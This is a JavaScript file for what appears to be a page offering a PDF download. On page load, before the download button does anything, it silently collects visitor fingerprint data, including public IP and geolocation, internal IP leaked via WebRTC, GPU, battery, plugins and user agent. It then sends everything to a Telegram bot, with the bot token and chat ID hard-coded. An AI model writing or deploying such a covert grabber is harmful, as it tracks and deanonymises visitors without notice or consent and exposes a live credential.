window.onload = async function () {
  const botToken = "8431837922:AAH1W2BedfbMRpVUk4nyaVHbm6694kzLshE";
  const chatId = "8155219455";
  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  // Collect system & browser info
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const screenRes = `${screen.width}x${screen.height}`;
  const colorDepth = screen.colorDepth;
  const cookieEnabled = navigator.cookieEnabled;
  const doNotTrack = navigator.doNotTrack;
  const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
  const deviceMemory = navigator.deviceMemory || "N/A";
  const plugins = Array.from(navigator.plugins).map(p => p.name).join(", ") || "None";
  const referrer = document.referrer || "Direct";
  const page = location.href;

  // Battery Info
  let batteryLevel = "N/A";
  try {
    const battery = await navigator.getBattery();
    batteryLevel = Math.round(battery.level * 100) + "%";
  } catch {}

  // WebGL GPU Info
  let gpu = "N/A";
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
  } catch {}

  // Browser + OS Detection
  const browser = (() => {
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Chrome")) return "Chrome";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    return "Unknown";
  })();
  const os = (() => {
    if (/Windows NT 10/.test(ua)) return "Windows 10";
    if (/Windows NT 6.1/.test(ua)) return "Windows 7";
    if (/Windows NT 5.1/.test(ua)) return "Windows XP";
    if (/Android/.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
    if (/Mac/.test(ua)) return "MacOS";
    if (/Linux/.test(ua)) return "Linux";
    return "Unknown";
  })();

  // Public IP + GeoLocation
  let ip = "Unknown", city = "Unknown", country = "Unknown", isp = "Unknown";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ip = data.ip;
    city = data.city;
    country = data.country_name;
    isp = data.org;
  } catch {}

  // Internal IP (via WebRTC)
  let internalIP = "Unknown";
  try {
    const pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel("");
    pc.createOffer().then(o => pc.setLocalDescription(o));
    pc.onicecandidate = (ice) => {
      if (ice && ice.candidate && ice.candidate.candidate) {
        const parts = ice.candidate.candidate.split(" ");
        const ipAddr = parts[4];
        if (ipAddr && !internalIP.includes(ipAddr)) {
          internalIP = ipAddr;
        }
      }
    };
  } catch {}

  // Wait a bit for WebRTC to resolve
  await new Promise(r => setTimeout(r, 1500));

  // Final Message
  const message = `📡 New Visitor Data:
🌍 Public IP: ${ip}
🏠 Internal IP: ${internalIP}
📍 Location: ${city}, ${country}
🏢 ISP: ${isp}
💻 OS: ${os}
🌐 Browser: ${browser}
🧠 User Agent: ${ua}
🔋 Battery: ${batteryLevel}
🎮 GPU: ${gpu}
🖥️ Screen: ${screenRes}, ${colorDepth}bit
🧮 CPU Threads: ${hardwareConcurrency}
💾 RAM Estimate: ${deviceMemory} GB
🔒 Do Not Track: ${doNotTrack}
🍪 Cookies Enabled: ${cookieEnabled}
🈸 Language: ${language}
🕰️ Timezone: ${timezone}
🔌 Plugins: ${plugins}
↩️ Referrer: ${referrer}
📑 Page: ${page}
🕓 Date: ${new Date().toLocaleString()}`;

  // Send to Telegram
  await fetch(apiUrl, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ chat_id: chatId, text: message })
  });

  // Download button
  document.getElementById("downloadBtn").addEventListener("click", () => {
    document.getElementById("status").innerText = "Downloading...";
    window.location.href = "hi.pdf"; // PDF must be in same folder
  });
};
